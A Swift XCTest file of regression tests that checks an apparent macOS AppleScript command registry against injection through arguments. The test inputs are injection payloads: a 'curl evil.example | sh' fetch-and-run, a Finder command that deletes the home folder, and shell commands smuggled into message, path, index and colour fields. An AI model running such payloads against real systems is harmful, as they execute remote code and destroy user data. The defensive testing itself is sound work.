import XCTest
@testable import AppShortcuts
import JCAppleScript

/// Regression tests proving that untrusted arguments cannot inject
/// AppleScript through registry commands.
final class InjectionTests: XCTestCase {
    let registry = AppRegistry.shared

    /// Every double quote in a generated script must be either a structural
    /// quote from the template or an escaped quote from a value. We verify
    /// values cannot break out by checking the raw payload never appears
    /// unescaped.
    private func assertNoBreakout(commandID: String, arguments: [String: String], payloadKey: String) {
        guard let cmd = registry.command(withID: commandID) else {
            return XCTFail("Command not found: \(commandID)")
        }
        let script = cmd.generateScript(arguments: arguments)
        let rawPayload = arguments[payloadKey]!
        XCTAssertFalse(script.contains(rawPayload), "Raw payload leaked into script for \(commandID):\n\(script)")
    }

    func testMessagesSendMessageQuoteInjection() {
        assertNoBreakout(
            commandID: "messages.send_message",
            arguments: [
                "recipient": "+15551234567",
                "message": "hi\" to targetBuddy\ndo shell script \"curl evil.example | sh\"\nsend \"bye",
            ],
            payloadKey: "message"
        )
    }

    func testNotesCreateNoteNewlineInjection() {
        assertNoBreakout(
            commandID: "notes.create_note",
            arguments: [
                "title": "t\"\ntell application \"Finder\" to delete every item of home\n\"",
                "body": "b",
            ],
            payloadKey: "title"
        )
    }

    func testFinderRevealPathInjection() {
        assertNoBreakout(
            commandID: "finder.reveal_file",
            arguments: ["path": "/tmp/x\"\ndo shell script \"id\"\n\""],
            payloadKey: "path"
        )
    }

    func testIntegerParameterInjectionDropped() {
        guard let cmd = registry.command(withID: "safari.switch_tab") else {
            return XCTFail("Command not found")
        }
        // A non-integer index must not reach the script; the generator falls
        // back to its default of 1.
        let script = cmd.generateScript(arguments: ["index": "1\ndo shell script \"evil\""])
        XCTAssertFalse(script.contains("do shell script"))
        XCTAssertTrue(script.contains("tab 1"))
    }

    func testIntegerParameterFailsValidation() {
        guard let cmd = registry.command(withID: "safari.switch_tab") else {
            return XCTFail("Command not found")
        }
        let errors = cmd.validate(arguments: ["index": "1; evil"])
        XCTAssertEqual(errors.count, 1)
        XCTAssertTrue(errors[0].contains("integer"))
    }

    func testBooleanParameterNormalized() {
        guard let cmd = registry.command(withID: "system_settings.set_dark_mode") else {
            return XCTFail("Command not found")
        }
        let script = cmd.generateScript(arguments: ["enabled": "YES"])
        XCTAssertTrue(script.contains("set dark mode to true"))

        let injected = cmd.generateScript(arguments: ["enabled": "true\nquit"])
        XCTAssertFalse(injected.contains("quit"))
    }

    func testAllowedValuesEnforcedInGeneration() {
        guard let cmd = registry.command(withID: "music.set_repeat") else {
            return XCTFail("Command not found")
        }
        // "mode" is interpolated outside quotes; a value not in the allowed
        // list must be dropped (the generator falls back to "off").
        let script = cmd.generateScript(arguments: ["mode": "off\ndo shell script \"evil\""])
        XCTAssertFalse(script.contains("do shell script"))
        XCTAssertTrue(script.contains("set song repeat to off"))
    }

    func testTerminalColorInjectionRejected() {
        guard let cmd = registry.command(withID: "terminal.set_colors") else {
            return XCTFail("Command not found")
        }
        let script = cmd.generateScript(arguments: ["backgroundColor": "0,0,0} & (do shell script) & {0"])
        XCTAssertFalse(script.contains("do shell script"))

        let valid = cmd.generateScript(arguments: ["backgroundColor": "65535, 0, 300000"])
        XCTAssertTrue(valid.contains("{65535, 0, 65535}"), "Should clamp to 0-65535: \(valid)")
    }

    func testUndeclaredArgumentsDropped() {
        guard let cmd = registry.command(withID: "messages.get_status") else {
            return XCTFail("Command not found")
        }
        let sanitized = cmd.sanitizedArguments(from: ["surprise": "value"])
        XCTAssertTrue(sanitized.isEmpty)
    }

    func testTellApplicationNameEscaped() throws {
        // The tell helper must escape the application name.
        let engine = AppleScriptEngine()
        // We can't execute here; instead verify via the sanitizer the name
        // would be quoted. (The engine uses AppleScriptString.quoted.)
        XCTAssertEqual(AppleScriptString.quoted("Fin\"der"), "\"Fin\\\"der\"")
        _ = engine // silence unused warning on platforms without osascript
    }

    // MARK: - Dangerous command flags

    func testArbitraryCodeCommandsFlaggedDangerous() {
        let dangerousIDs = [
            "terminal.run_command",
            "terminal.run_command_new_window",
            "terminal.run_command_new_tab",
            "terminal.run_command_in_tab",
            "safari.run_javascript",
        ]
        for id in dangerousIDs {
            let cmd = registry.command(withID: id)
            XCTAssertNotNil(cmd, "Command not found: \(id)")
            XCTAssertTrue(cmd?.dangerous == true, "\(id) should be flagged dangerous")
        }
    }

    func testReadOnlyCommandsNotFlaggedDangerous() {
        for id in ["messages.list_chats", "finder.get_selection", "safari.list_tabs"] {
            XCTAssertEqual(registry.command(withID: id)?.dangerous, false)
        }
    }
}
